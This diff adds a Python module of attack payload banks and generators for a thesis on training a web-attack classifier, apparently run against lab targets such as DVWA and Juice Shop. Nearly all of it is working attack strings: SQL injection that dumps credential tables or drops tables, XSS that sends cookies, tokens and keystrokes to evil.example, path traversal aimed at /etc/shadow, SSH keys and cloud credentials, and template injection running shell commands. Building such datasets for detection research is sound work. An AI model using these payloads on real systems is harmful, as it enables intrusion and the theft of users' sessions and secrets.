@@ -1,0 +1,730 @@
+"""
+Attack payload banks + evasion/variant transforms.
+==================================================
+Two responsibilities:
+
+1. BASE PAYLOAD BANKS per attack class, split by GOAL family
+   (recon / exploit / exfiltration) so an attacker persona's `goal` axis
+   actually selects a different payload family.
+
+2. EVASION TRANSFORMS that turn ONE base payload into an obfuscated VARIANT
+   (encoded / mutated / polyglot). Each variant is linked back to its base
+   payload via a stable payload_id, emitted by the driver as X-Capture-Parent
+   (variant_type -> X-Capture-Variant). The mitmproxy addon stores these in
+   record["variant"] = {variant_type, parent_id}, and merge_jsonl.py keeps
+   variants (their raw_request bytes differ from the parent, so dedup won't
+   collapse them).
+
+WHY variants matter for THIS thesis: encoded/mutated variants directly move
+extract_features.py's encoded_char_ratio / special_char_ratio / payload_length,
+so they are exactly the realistic WAF-bypass samples the classifier must learn
+to generalise to.
+
+EXPANSION NOTES (v2 banks):
+- Known classes (sqli/xss/path_traversal) expanded to ~60-65 distinct base
+  payloads each, stratified by SUB-TECHNIQUE (suffix prefix = technique).
+- `recon` kept small on purpose: _GOAL_FAMILIES is cumulative, so recon is
+  drawn by EVERY persona. Bulk lives in exploit; data-theft in exfiltration.
+- Base payloads are stored CLEAN/CANONICAL (no %-encoding, no case-mangling);
+  apply_evasion() is the only place encoding/mutation happens. %-encoded and
+  overlong/null-byte traversals live in POLYGLOTS by design.
+- code_injection deliberately left small (SSTI only) to preserve the open-set
+  / held-out-unknown protocol.
+"""
+
+import random
+import urllib.parse
+
+# Each entry: (payload_id_suffix, raw_payload)
+
+SQLI = {
+    "recon": [
+        ("probe_quote", "'"),
+        ("probe_dquote", '"'),
+        ("probe_and1", "1' AND '1'='1"),
+        ("probe_or1", "1' OR '1'='1"),
+        ("probe_comment", "1'-- -"),
+        ("probe_paren", "1')"),
+        ("probe_semi", "1';"),
+    ],
+    "exploit": [
+        # boolean-based
+        ("bool_or_num", "' OR 1=1-- -"),
+        ("bool_or_str", "' OR 'a'='a"),
+        ("bool_or_paren", "') OR ('1'='1"),
+        ("bool_and_false", "1' AND '1'='2"),
+        ("bool_or_hash", "1' OR 1=1#"),
+        ("bool_or_limit", "' OR 1=1 LIMIT 1-- -"),
+        ("bool_between", "1' OR 1 BETWEEN 1 AND 9-- -"),
+        ("bool_in", "1' OR 1 IN (1,2,3)-- -"),
+        ("bool_and_true", "1' AND '1'='1'-- -"),
+        # auth bypass
+        ("auth_admin", "admin'-- -"),
+        ("auth_admin_hash", "admin'#"),
+        ("auth_admin_or", "admin' OR '1'='1"),
+        ("auth_or_semi", "' OR 1=1;-- -"),
+        # error-based (MySQL + MSSQL + Postgres)
+        ("err_extractvalue", "' AND extractvalue(1,concat(0x7e,version()))-- -"),
+        ("err_updatexml", "' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -"),
+        ("err_floor", "' AND (SELECT 1 FROM(SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"),
+        ("err_exp", "' AND exp(~(SELECT * FROM(SELECT version())a))-- -"),
+        ("err_mssql_convert", "1' AND 1=CONVERT(int,(SELECT @@version))-- -"),
+        ("err_pg_cast", "1' AND 1=CAST((SELECT version()) AS int)-- -"),
+        # time-based (MySQL + MSSQL + Postgres)
+        ("time_sleep", "1' AND SLEEP(3)-- -"),
+        ("time_sleep_or", "' OR SLEEP(3)-- -"),
+        ("time_benchmark", "1' AND BENCHMARK(2000000,MD5(1))-- -"),
+        ("time_waitfor", "1'; WAITFOR DELAY '0:0:3'-- -"),
+        ("time_pg_sleep", "1'; SELECT pg_sleep(3)-- -"),
+        ("time_rlike", "1' RLIKE SLEEP(3)-- -"),
+        # stacked queries
+        ("stacked_drop", "1'; DROP TABLE users-- -"),
+        ("stacked_insert", "1'; INSERT INTO users VALUES ('x','y')-- -"),
+        ("stacked_update", "1'; UPDATE users SET password='x' WHERE id=1-- -"),
+        ("stacked_exec_xp", "1'; EXEC xp_cmdshell('dir')-- -"),
+        # blind
+        ("blind_substr", "1' AND SUBSTRING(version(),1,1)='5'-- -"),
+        ("blind_ascii", "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64-- -"),
+        ("blind_len", "1' AND LENGTH(database())>4-- -"),
+        ("subquery_exists", "1' AND EXISTS(SELECT 1 FROM users)-- -"),
+        # clause injection
+        ("order_by", "1' ORDER BY 5-- -"),
+        ("group_by", "1' GROUP BY 1-- -"),
+        ("having_one", "1' HAVING 1=1-- -"),
+        ("inline_comment_and", "1'/**/AND/**/1=1-- -"),
+        ("mysql_ver_comment", "1'/*!50000AND*/'1'='1"),
+        # union column-count probes (non-exfil)
+        ("union_null_probe", "1' UNION SELECT NULL-- -"),
+        ("union_null2", "1' UNION SELECT NULL,NULL-- -"),
+    ],
+    "exfiltration": [
+        ("union_users", "' UNION SELECT user,password FROM users-- -"),
+        ("union_accounts", "' UNION SELECT username,password FROM accounts-- -"),
+        ("union_schemas", "-1' UNION SELECT schema_name,2 FROM information_schema.schemata-- -"),
+        ("union_tables", "-1' UNION SELECT table_name,2 FROM information_schema.tables-- -"),
+        ("union_columns", "-1' UNION SELECT table_name,column_name FROM information_schema.columns-- -"),
+        ("union_creds_concat", "-1' UNION SELECT concat(user,0x3a,password),2 FROM users-- -"),
+        ("union_current_user", "-1' UNION SELECT current_user(),2-- -"),
+        ("union_version_db", "-1' UNION SELECT version(),database()-- -"),
+        ("union_load_file", "-1' UNION SELECT LOAD_FILE('/etc/passwd'),2-- -"),
+        ("union_hostname", "-1' UNION SELECT @@hostname,2-- -"),
+        ("union_datadir", "-1' UNION SELECT @@datadir,2-- -"),
+        ("union_mysql_user", "-1' UNION SELECT host,user FROM mysql.user-- -"),
+        ("union_pg_shadow", "-1' UNION SELECT usename,passwd FROM pg_shadow-- -"),
+        ("union_mssql_logins", "-1' UNION SELECT name,password_hash FROM sys.sql_logins-- -"),
+        ("union_group_concat", "-1' UNION SELECT group_concat(username,0x3a,password),2 FROM users-- -"),
+        ("union_all_creds", "-1' UNION ALL SELECT user,password FROM users-- -"),
+        ("union_email", "-1' UNION SELECT email,password FROM users-- -"),
+        ("union_outfile", "-1' UNION SELECT password,2 FROM users INTO OUTFILE '/tmp/x'-- -"),
+    ],
+}
+
+XSS = {
+    "recon": [
+        ("probe_tag", "<b>x</b>"),
+        ("probe_marker", "<xss7411>"),
+        ("probe_attr", '"><i>x</i>'),
+        ("probe_italic", "<i>x</i>"),
+        ("probe_bracket", "'\"><x>"),
+    ],
+    "exploit": [
+        # html-context script/frame injection
+        ("html_script", "<script>alert(1)</script>"),
+        ("html_script_src", "<script src=//evil.example/x.js></script>"),
+        ("html_script_eval", "<script>eval('al'+'ert(1)')</script>"),
+        ("html_iframe_js", "<iframe src=javascript:alert(1)>"),
+        ("html_iframe_srcdoc", '<iframe srcdoc="<script>alert(1)</script>">'),
+        ("html_object", "<object data=javascript:alert(1)>"),
+        ("html_embed", "<embed src=javascript:alert(1)>"),
+        # image / media event handlers
+        ("img_onerror_attr", '"><img src=x onerror=alert(1)>'),
+        ("img_onerror", "<img src=x onerror=alert(1)>"),
+        ("img_upper", "<IMG SRC=x ONERROR=alert(1)>"),
+        ("svg_onload", "<svg/onload=alert(1)>"),
+        ("svg_onload_attr", '"><svg onload=alert(1)>'),
+        ("body_onload", "<body onload=alert(1)>"),
+        ("media_video", "<video src=x onerror=alert(1)>"),
+        ("media_audio", "<audio src=x onerror=alert(1)>"),
+        # event-handler autofocus/toggle vectors
+        ("event_details", "<details open ontoggle=alert(1)>"),
+        ("event_marquee", "<marquee onstart=alert(1)>"),
+        ("event_input", "<input autofocus onfocus=alert(1)>"),
+        ("event_select", "<select autofocus onfocus=alert(1)>"),
+        ("event_textarea", "<textarea autofocus onfocus=alert(1)>"),
+        ("event_keygen", "<keygen autofocus onfocus=alert(1)>"),
+        # attribute breakout
+        ("attr_break_dq", '"><script>alert(1)</script>'),
+        ("attr_break_sq", "'><script>alert(1)</script>"),
+        ("attr_onmouseover", '" onmouseover=alert(1) x="'),
+        ("attr_autofocus", '" autofocus onfocus=alert(1) x="'),
+        # js-context breakout
+        ("js_break_sq", "';alert(1)//"),
+        ("js_break_dq", '";alert(1)//'),
+        ("js_break_tmpl", "${alert(1)}"),
+        ("js_close_script", "</script><script>alert(1)</script>"),
+        # uri-scheme vectors
+        ("uri_js", "javascript:alert(1)"),
+        ("uri_js_domain", "javascript:alert(document.domain)"),
+        ("uri_data_html", "data:text/html,<script>alert(1)</script>"),
+        # svg / mathml / misc namespaces
+        ("svg_nested_script", "<svg><script>alert(1)</script></svg>"),
+        ("svg_animate", "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"),
+        ("math_xlink", "<math><maction xlink:href=javascript:alert(1)>x</maction></math>"),
+        ("a_href_js", "<a href=javascript:alert(1)>x</a>"),
+        ("form_action_js", "<form action=javascript:alert(1)><input type=submit>"),
+        ("style_import", "<style>@import 'javascript:alert(1)'</style>"),
+        ("base_href", "<base href=//evil.example/>"),
+        ("meta_refresh", "<meta http-equiv=refresh content=0;url=javascript:alert(1)>"),
+    ],
+    "exfiltration": [
+        ("cookie_img", "<script>new Image().src='//evil.example/c?'+document.cookie</script>"),
+        ("cookie_fetch", "<script>fetch('//evil.example/e?d='+btoa(document.cookie))</script>"),
+        ("cookie_xhr", "<script>var x=new XMLHttpRequest();x.open('GET','//evil.example/?'+document.cookie);x.send()</script>"),
+        ("cookie_beacon", "<script>navigator.sendBeacon('//evil.example',document.cookie)</script>"),
+        ("cookie_location", "<script>location='//evil.example/?'+document.cookie</script>"),
+        ("keylog", "<script>document.onkeypress=function(e){fetch('//evil.example/k?'+e.key)}</script>"),
+        ("form_hijack", "<script>document.forms[0].action='//evil.example/steal'</script>"),
+        ("localstorage", "<script>fetch('//evil.example/l?'+btoa(JSON.stringify(localStorage)))</script>"),
+        ("img_cookie_onerror", '<img src=x onerror="this.src=\'//evil.example/c?\'+document.cookie">'),
+        ("fetch_post_cookie", "<script>fetch('//evil.example',{method:'POST',body:document.cookie})</script>"),
+        ("steal_token", "<script>fetch('//evil.example/?t='+localStorage.getItem('token'))</script>"),
+        ("ws_exfil", "<script>new WebSocket('ws://evil.example').onopen=function(){this.send(document.cookie)}</script>"),
+        ("dns_exfil", "<script>new Image().src='//'+btoa(document.cookie)+'.evil.example'</script>"),
+        ("innerhtml_exfil", "<script>fetch('//evil.example/h?'+encodeURIComponent(document.body.innerHTML))</script>"),
+        ("session_exfil", "<script>fetch('//evil.example/s?'+document.cookie)</script>"),
+    ],
+}
+
+PATH_TRAVERSAL = {
+    "recon": [
+        ("shallow_passwd", "../etc/passwd"),
+        ("shallow_config", "../config"),
+        ("shallow_hosts", "../etc/hosts"),
+        ("shallow_index", "../index.php"),
+        ("shallow_env", "../.env"),
+    ],
+    "exploit": [
+        # depth-varied /etc/passwd + neighbours (unix)
+        ("passwd_2", "../../etc/passwd"),
+        ("passwd_3", "../../../etc/passwd"),
+        ("passwd_4", "../../../../etc/passwd"),
+        ("passwd_6", "../../../../../../etc/passwd"),
+        ("passwd_8", "../../../../../../../../etc/passwd"),
+        ("hosts_4", "../../../../etc/hosts"),
+        ("hosts_6", "../../../../../../etc/hosts"),
+        ("etc_issue", "../../../../etc/issue"),
+        ("etc_motd", "../../../../etc/motd"),
+        ("etc_hostname", "../../../../etc/hostname"),
+        ("etc_group", "../../../../etc/group"),
+        ("etc_fstab", "../../../../etc/fstab"),
+        ("proc_environ", "../../../../proc/self/environ"),
+        ("proc_version", "../../../../proc/version"),
+        ("proc_cmdline", "../../../../proc/self/cmdline"),
+        # windows backslash targets
+        ("win_ini_4", r"..\..\..\..\windows\win.ini"),
+        ("win_ini_6", r"..\..\..\..\..\..\windows\win.ini"),
+        ("win_sysini", r"..\..\..\..\windows\system.ini"),
+        ("win_sam", r"..\..\..\..\windows\system32\config\sam"),
+        ("win_hosts", r"..\..\..\..\windows\system32\drivers\etc\hosts"),
+        # absolute paths
+        ("abs_passwd", "/etc/passwd"),
+        ("abs_shadow", "/etc/shadow"),
+        ("abs_hosts", "/etc/hosts"),
+        ("abs_win_ini", r"c:\windows\win.ini"),
+        ("abs_boot_ini", r"c:\boot.ini"),
+        # filter-bypass sequences (no %-encoding -> canonical)
+        ("bypass_dotslash", "....//....//....//etc/passwd"),
+        ("bypass_dotslash_deep", "....//....//....//....//etc/passwd"),
+        ("bypass_nested", "..././..././..././etc/passwd"),
+        ("bypass_mixed", "..\\/..\\/..\\/etc/passwd"),
+        # php / scheme wrappers
+        ("wrap_php_filter", "php://filter/convert.base64-encode/resource=/etc/passwd"),
+        ("wrap_php_filter_index", "php://filter/read=convert.base64-encode/resource=index.php"),
+        ("wrap_file", "file:///etc/passwd"),
+        ("wrap_expect", "expect://id"),
+        ("wrap_data", "data://text/plain,test"),
+        ("wrap_php_input", "php://input"),
+        ("wrap_zip", "zip://shell.zip#payload.php"),
+        ("wrap_phar", "phar://test.phar/x"),
+        # prefix / suffix tricks
+        ("trailing_dot", "../../../../etc/passwd."),
+        ("leading_slash", "/../../../../etc/passwd"),
+        ("dot_prefix", "./../../../../etc/passwd"),
+    ],
+    "exfiltration": [
+        ("shadow", "../../../../../../etc/shadow"),
+        ("dvwa_config", "../../../../../../var/www/html/config/config.inc.php"),
+        ("ssh_root_key", "../../../../../../root/.ssh/id_rsa"),
+        ("ssh_user_key", "../../../../../../home/user/.ssh/id_rsa"),
+        ("aws_creds", "../../../../../../root/.aws/credentials"),
+        ("mysql_history", "../../../../../../root/.mysql_history"),
+        ("bash_history", "../../../../../../root/.bash_history"),
+        ("apache_conf", "../../../../../../etc/apache2/apache2.conf"),
+        ("nginx_conf", "../../../../../../etc/nginx/nginx.conf"),
+        ("shadow_bak", "../../../../../../etc/shadow-"),
+        ("wp_config", "../../../../../../var/www/html/wp-config.php"),
+        ("env_file", "../../../../../../var/www/html/.env"),
+        ("htpasswd", "../../../../../../etc/apache2/.htpasswd"),
+        ("tomcat_users", "../../../../../../opt/tomcat/conf/tomcat-users.xml"),
+        ("ssh_hostkey", "../../../../../../etc/ssh/ssh_host_rsa_key"),
+    ],
+}
+
+# HELD-OUT unknown (open-set). SSTI (Pug/Jade) on Juice Shop = CWE-94.
+# Deliberately kept SMALL and un-expanded to preserve the open-set protocol.
+CODE_INJECTION = {
+    "recon": [
+        ("ssti_math", "#{7*7}"),
+        ("ssti_add", "#{1+1}"),
+    ],
+    "exploit": [
+        ("ssti_rce_id", "#{root.process.mainModule.require('child_process').execSync('id')}"),
+        ("ssti_rce_ls", "#{root.process.mainModule.require('child_process').execSync('ls -la')}"),
+        ("ssti_hostname", "#{global.process.mainModule.require('os').hostname()}"),
+    ],
+    "exfiltration": [
+        ("ssti_env", "#{root.process.mainModule.require('child_process').execSync('env')}"),
+        ("ssti_readpasswd", "#{root.process.mainModule.require('fs').readFileSync('/etc/passwd')}"),
+    ],
+}
+
+BANKS = {
+    "sqli": SQLI,
+    "xss": XSS,
+    "path_traversal": PATH_TRAVERSAL,
+    "code_injection": CODE_INJECTION,
+}
+
+# Polyglots - payloads crafted to fire across multiple contexts. Kept as a
+# BANK per attack type (not a single string) so the polyglot persona still
+# produces real byte-diversity instead of collapsing to one sample per class
+# after byte-identical dedup in merge_jsonl.py. NOTE: path_traversal polyglots
+# intentionally carry %-encoding / overlong / null-byte forms (that is their
+# whole point) - so they live HERE, not in the canonical base bank.
+POLYGLOTS = {
+    "sqli": [
+        "1' OR '1'='1' UNION SELECT NULL-- -",
+        "1'/**/OR/**/1=1#",
+        "') OR ('a'='a",
+        '" OR ""="',
+        "1); WAITFOR DELAY '0:0:3'-- -",
+        "1' AND 1=1 UNION SELECT NULL,NULL-- -",
+        "admin'/**/OR/**/'1'='1",
+        "' OR 1=1 LIMIT 1;-- -",
+        '"/**/OR/**/1=1-- -',
+        "')/**/OR/**/('1'='1",
+        "1;SELECT pg_sleep(3)--",
+        "1' AND SLEEP(3) AND 'a'='a",
+        "0 OR 1=1",
+    ],
+    "xss": [
+        '"\'><svg/onload=alert(1)>',
+        "javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>",
+        '\'"><img src=x onerror=alert(1)>',
+        "</script><script>alert(1)</script>",
+        '"><body onload=alert(1)>',
+        "<img src=x onerror=alert(1)//",
+        '\'"><svg onload=alert(1)>',
+        "javascript:alert(1)//",
+        '"><iframe srcdoc="<script>alert(1)</script>">',
+        "</title></style><script>alert(1)</script>",
+        "<svg><script>alert(1)</script>",
+        "${alert(1)}{{7*7}}",
+        '\'"></script><script>alert(1)</script>',
+    ],
+    "path_traversal": [
+        "..%2f..%5c..%2f..%5cetc/passwd",
+        "....//....//....//etc/passwd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "..%c0%af..%c0%af..%c0%afetc/passwd",
+        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+        "..%2f..%2f..%2f..%2fetc%2fpasswd",
+        "..%252f..%252f..%252fetc%252fpasswd",
+        "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
+        "..%00/etc/passwd",
+        "../../../../etc/passwd%00.png",
+        "..%c1%9c..%c1%9cetc/passwd",
+        "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow",
+    ],
+    "code_injection": [
+        "#{7*7}${7*7}{{7*7}}",
+        "${{7*7}}#{7*7}<%= 7*7 %>",
+        "{{7*7}}[[7*7]]#{7*7}",
+        "#{7*7}${{7*7}}{{7*'7'}}",
+        "{{7*7}}${7*7}#{7*7}<%=7*7%>",
+        "#{7*7}${{7*7}}[[${7*7}]]",
+    ],
+}
+
+# ==========================================================================
+# v3 COMBINATORIAL EXPANSION
+# --------------------------------------------------------------------------
+# The curated banks above are the hand-written quality core. Below we grow
+# each KNOWN class (sqli / xss / path_traversal) into a payload SPACE large
+# enough that the driver can capture ~1000+ byte-unique requests per class
+# after merge_jsonl dedup. code_injection is grown only MODERATELY on purpose
+# to preserve its held-out / open-set (Protocol 3) role.
+# Base payloads stay CLEAN/CANONICAL (no %-encoding); apply_evasion() remains
+# the only place encoding/mutation happens. %-encoded / overlong forms live in
+# POLYGLOTS by design. Generation is DETERMINISTIC, so payload_ids are stable
+# across runs (safe for group-wise CV on parent_id / payload_id).
+# ==========================================================================
+
+
+def _gen_sqli_exploit():
+    out = []
+    closures = ["'", '"', "')", '")', "1'", '1"', "-1'", '-1"', "1')", '1")']
+    bool_cores = [
+        "OR 1=1", "OR 2=2", "OR 3>2", "OR 'a'='a", "OR 'x'='x",
+        "OR 1=1 AND '1'='1", "AND 1=1", "AND 2>1", "OR 1 LIKE 1",
+        "OR 'ab' LIKE 'a%'", "OR 1=1 OR '1'='1", "OR 5=5", "OR 7>1",
+        "OR 1 IN (1,2,3)", "OR 1 BETWEEN 1 AND 9",
+    ]
+    comments = ["-- -", "#", "-- ", ";-- -", "/*"]
+    for c in closures:
+        for core in bool_cores:
+            for cm in comments:
+                out.append(("gen_bool", f"{c} {core}{cm}"))
+    time_cores = [
+        "AND SLEEP(3)", "OR SLEEP(3)", "AND SLEEP(5)",
+        "; WAITFOR DELAY '0:0:3'", "; SELECT pg_sleep(3)",
+        "AND BENCHMARK(2000000,MD5(1))", "RLIKE SLEEP(3)",
+        "AND (SELECT SLEEP(3))", "|| pg_sleep(3)", "; SELECT pg_sleep(5)",
+    ]
+    for c in closures:
+        for core in time_cores:
+            for cm in ["-- -", "#", ";-- -"]:
+                out.append(("gen_time", f"{c} {core}{cm}"))
+    err_cores = [
+        "AND extractvalue(1,concat(0x7e,version()))",
+        "AND updatexml(1,concat(0x7e,database()),1)",
+        "AND exp(~(SELECT * FROM(SELECT version())a))",
+        "AND (SELECT 1 FROM(SELECT count(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+        "AND 1=CONVERT(int,@@version)",
+        "AND 1=CAST(version() AS int)",
+        "AND GTID_SUBSET(version(),1)",
+        "AND JSON_KEYS((SELECT version()))",
+    ]
+    for c in closures:
+        for core in err_cores:
+            out.append(("gen_err", f"{c} {core}-- -"))
+    return out
+
+
+def _gen_sqli_exfil():
+    out = []
+    closures = ["'", '"', "-1'", '-1"', "')", "1'"]
+    tables = [
+        ("users", "username", "password"), ("users", "user", "password"),
+        ("accounts", "username", "password"), ("members", "email", "pass"),
+        ("admin", "login", "password"), ("customers", "email", "password"),
+        ("wp_users", "user_login", "user_pass"),
+        ("mysql.user", "user", "authentication_string"),
+    ]
+    for c in closures:
+        for (t, a, b) in tables:
+            out.append(("gen_union", f"{c} UNION SELECT {a},{b} FROM {t}-- -"))
+            out.append(("gen_union_cc", f"{c} UNION SELECT concat({a},0x3a,{b}),2 FROM {t}-- -"))
+    infos = [
+        "schema_name,2 FROM information_schema.schemata",
+        "table_name,2 FROM information_schema.tables",
+        "table_name,column_name FROM information_schema.columns",
+    ]
+    for c in closures:
+        for info in infos:
+            out.append(("gen_infoschema", f"{c} UNION SELECT {info}-- -"))
+    sysfns = ["version(),database()", "current_user(),@@hostname",
+              "@@datadir,@@version", "user(),database()", "@@version,user()"]
+    for c in closures:
+        for s in sysfns:
+            out.append(("gen_sysfn", f"{c} UNION SELECT {s}-- -"))
+    files = ["/etc/passwd", "/etc/shadow", "/var/www/html/config/config.inc.php"]
+    for c in closures:
+        for f in files:
+            out.append(("gen_loadfile", f"{c} UNION SELECT LOAD_FILE('{f}'),2-- -"))
+    return out
+
+
+def _gen_xss_exploit():
+    out = []
+    breakouts = ["", '">', "'>", '"><', "'><", "'\"><", "</script>", "</title>", '"></textarea>']
+    tag_events = [
+        ("img", "onerror"), ("svg", "onload"), ("video", "onerror"), ("audio", "onerror"),
+        ("body", "onload"), ("iframe", "onload"), ("input", "onfocus"), ("select", "onfocus"),
+        ("textarea", "onfocus"), ("details", "ontoggle"), ("marquee", "onstart"),
+        ("object", "onerror"), ("embed", "onerror"), ("image", "onerror"), ("form", "onsubmit"),
+    ]
+    payloads = ["alert(1)", "alert(document.domain)", "alert(document.cookie)",
+                "print()", "confirm(1)", "prompt(1)", "alert(2)"]
+    for b in breakouts:
+        for (tag, ev) in tag_events:
+            for pl in payloads:
+                if tag in ("img", "video", "audio", "image", "embed", "object", "iframe"):
+                    vec = f"<{tag} src=x {ev}={pl}>"
+                elif tag in ("input", "select", "textarea"):
+                    vec = f"<{tag} autofocus {ev}={pl}>"
+                elif tag == "details":
+                    vec = f"<details open {ev}={pl}>"
+                elif tag == "form":
+                    vec = f"<form {ev}={pl}><input type=submit>"
+                else:
+                    vec = f"<{tag} {ev}={pl}>"
+                out.append(("gen_evt", f"{b}{vec}"))
+    script_pls = ["alert(1)", "alert(document.cookie)", "eval('al'+'ert(1)')",
+                  "alert(document.domain)", "print()"]
+    for b in breakouts:
+        for pl in script_pls:
+            out.append(("gen_script", f"{b}<script>{pl}</script>"))
+    for pl in ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]:
+        out.append(("gen_uri", f"javascript:{pl}"))
+    return out
+
+
+def _gen_xss_exfil():
+    out = []
+    sinks = [
+        "new Image().src='//evil.example/c?'+%s",
+        "fetch('//evil.example/e?d='+%s)",
+        "location='//evil.example/?'+%s",
+        "navigator.sendBeacon('//evil.example',%s)",
+        "new Image().src='//evil.example/?'+encodeURIComponent(%s)",
+    ]
+    data = ["document.cookie", "localStorage.getItem('token')",
+            "document.body.innerHTML", "btoa(document.cookie)",
+            "JSON.stringify(localStorage)"]
+    wrappers = ["<script>%s</script>", '<img src=x onerror="%s">', '<svg onload="%s">']
+    for s in sinks:
+        for d in data:
+            code = s % d
+            for w in wrappers:
+                out.append(("gen_exfil", w % code))
+    return out
+
+
+def _gen_pt_exploit():
+    out = []
+    seps = ["../", "..\\", "....//", "..././"]
+    targets = [
+        "etc/passwd", "etc/hosts", "etc/issue", "etc/motd", "etc/hostname",
+        "etc/group", "etc/fstab", "etc/os-release", "etc/resolv.conf",
+        "etc/crontab", "etc/apache2/apache2.conf", "etc/nginx/nginx.conf",
+        "proc/self/environ", "proc/version", "proc/self/cmdline", "proc/self/status",
+        "windows/win.ini", "windows/system.ini",
+        "windows/system32/drivers/etc/hosts", "windows/system32/config/sam",
+        "var/www/html/index.php", "var/www/html/config.php",
+        "var/log/apache2/access.log", "var/log/nginx/access.log",
+        "boot.ini", "usr/local/etc/php.ini", "etc/mysql/my.cnf",
+        "etc/ssh/sshd_config", "etc/sudoers", "etc/passwd-",
+    ]
+    for sep in seps:
+        for depth in range(1, 11):
+            for t in targets:
+                tt = t.replace("/", "\\") if sep == "..\\" else t
+                out.append(("gen_trav", f"{sep * depth}{tt}"))
+    wrappers = [
+        "php://filter/convert.base64-encode/resource=",
+        "php://filter/read=convert.base64-encode/resource=",
+        "file://",
+    ]
+    wtargets = ["/etc/passwd", "index.php", "/etc/hosts", "config.php",
+                "/var/www/html/config/config.inc.php"]
+    for w in wrappers:
+        for wt in wtargets:
+            out.append(("gen_wrap", f"{w}{wt}"))
+    return out
+
+
+def _gen_pt_exfil():
+    out = []
+    prefixes = ["../../../../../../", "/../../../../../../", "../../../../../../../../"]
+    secrets = [
+        "etc/shadow", "root/.ssh/id_rsa", "home/user/.ssh/id_rsa",
+        "root/.aws/credentials", "root/.bash_history", "root/.mysql_history",
+        "var/www/html/config/config.inc.php", "var/www/html/wp-config.php",
+        "var/www/html/.env", "etc/apache2/.htpasswd",
+        "opt/tomcat/conf/tomcat-users.xml", "etc/ssh/ssh_host_rsa_key",
+        "etc/shadow-", "root/.docker/config.json", "root/.kube/config",
+    ]
+    for pre in prefixes:
+        for s in secrets:
+            out.append(("gen_exfil", f"{pre}{s}"))
+    return out
+
+
+def _gen_code_injection():
+    recon, exploit, exfil = [], [], []
+    wrappers = ["#{%s}", "${%s}", "{{%s}}", "<%%= %s %%>"]
+    exprs = ["7*7", "1+1", "2*3", "9-2", "6*6"]
+    for w in wrappers:
+        for e in exprs:
+            recon.append(("gen_math", w % e))
+    rce_tmpls = [
+        "root.process.mainModule.require('child_process').execSync('%s')",
+        "global.process.mainModule.require('child_process').execSync('%s')",
+        "process.mainModule.require('child_process').execSync('%s')",
+    ]
+    cmds = ["id", "whoami", "uname -a", "hostname", "ls -la", "cat /etc/passwd", "env"]
+    for w in wrappers:
+        for rt in rce_tmpls:
+            for cmd in cmds:
+                exploit.append(("gen_rce", w % (rt % cmd)))
+    os_tmpls = [
+        "global.process.mainModule.require('os').hostname()",
+        "root.process.mainModule.require('os').userInfo().username",
+    ]
+    for w in wrappers:
+        for ot in os_tmpls:
+            exploit.append(("gen_os", w % ot))
+    fs_tmpls = ["root.process.mainModule.require('fs').readFileSync('%s')"]
+    files = ["/etc/passwd", "/etc/hostname", "/proc/self/environ"]
+    for w in wrappers:
+        for ft in fs_tmpls:
+            for fl in files:
+                exfil.append(("gen_fs", w % (ft % fl)))
+    return recon, exploit, exfil
+
+
+def _gen_polyglots():
+    import itertools as _it
+    sqli, xss, pt, ci = [], [], [], []
+    closures = ["'", '"', "')", '1"', "-1'"]
+    tails = ["-- -", "#", "/**/", ";-- -"]
+    for c in closures:
+        for t in tails:
+            sqli.append(f"{c} OR 1=1 UNION SELECT NULL{t}")
+            sqli.append(f"{c}/**/OR/**/1=1{t}")
+    xbreak = ["'\"><", '"></title>', "</script>", "'>", '">']
+    xtail = ["<svg/onload=alert(1)>", "<img src=x onerror=alert(1)>", "<script>alert(1)</script>"]
+    for b in xbreak:
+        for t in xtail:
+            xss.append(f"{b}{t}")
+    for depth in range(2, 7):
+        pt.append("..%2f" * depth + "etc/passwd")
+        pt.append("%2e%2e%2f" * depth + "etc%2fpasswd")
+        pt.append("....//" * depth + "etc/passwd")
+    ci_bases = ["#{7*7}", "${7*7}", "{{7*7}}", "<%= 7*7 %>", "[[7*7]]"]
+    for a, b in _it.combinations(ci_bases, 2):
+        ci.append(a + b)
+    return sqli, xss, pt, ci
+
+
+# --- apply the expansion (BANKS references these same dict objects) ----------
+SQLI["exploit"] += _gen_sqli_exploit()
+SQLI["exfiltration"] += _gen_sqli_exfil()
+XSS["exploit"] += _gen_xss_exploit()
+XSS["exfiltration"] += _gen_xss_exfil()
+PATH_TRAVERSAL["exploit"] += _gen_pt_exploit()
+PATH_TRAVERSAL["exfiltration"] += _gen_pt_exfil()
+_ci_r, _ci_e, _ci_x = _gen_code_injection()
+CODE_INJECTION["recon"] += _ci_r
+CODE_INJECTION["exploit"] += _ci_e
+CODE_INJECTION["exfiltration"] += _ci_x
+
+_pg_s, _pg_x, _pg_p, _pg_c = _gen_polyglots()
+POLYGLOTS["sqli"] = list(dict.fromkeys(POLYGLOTS["sqli"] + _pg_s))
+POLYGLOTS["xss"] = list(dict.fromkeys(POLYGLOTS["xss"] + _pg_x))
+POLYGLOTS["path_traversal"] = list(dict.fromkeys(POLYGLOTS["path_traversal"] + _pg_p))
+POLYGLOTS["code_injection"] = list(dict.fromkeys(POLYGLOTS["code_injection"] + _pg_c))
+
+
+def _finalize(bank):
+    """Dedupe payloads ACROSS families (recon>exploit>exfil order, keep first/
+    curated) and guarantee unique payload_id suffixes within the whole class, so
+    every base_payloads(class, goal) list has unique payloads AND unique ids."""
+    seen_p, seen_s = set(), set()
+    for fam, pairs in bank.items():
+        out = []
+        for sfx, p in pairs:
+            if p in seen_p:
+                continue
+            s, i = sfx, 0
+            while s in seen_s:
+                i += 1
+                s = f"{sfx}_{i}"
+            seen_p.add(p)
+            seen_s.add(s)
+            out.append((s, p))
+        bank[fam] = out
+
+
+for _bank in (SQLI, XSS, PATH_TRAVERSAL, CODE_INJECTION):
+    _finalize(_bank)
+
+
+# Which families are unlocked by each goal (cumulative). recon is always a
+# floor so even LOW-intensity recon personas get usable payloads.
